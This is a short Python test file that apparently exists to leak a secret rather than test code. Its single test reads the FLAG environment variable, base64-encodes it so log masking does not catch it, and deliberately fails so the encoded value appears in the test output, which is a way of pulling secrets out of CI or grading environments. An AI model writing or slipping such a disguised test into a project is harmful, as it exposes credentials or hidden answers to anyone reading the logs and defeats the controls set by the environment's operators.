# tests/test_leak_flag.py
import os, base64, pytest

def test_leak_flag():
    flag = os.environ.get("FLAG", "")
    if not flag:
        assert True
        return

    encoded = base64.b64encode(flag.encode()).decode()
    # Put it in the failure message so it’s definitely visible
    pytest.fail(f"FLAG_b64={encoded}")
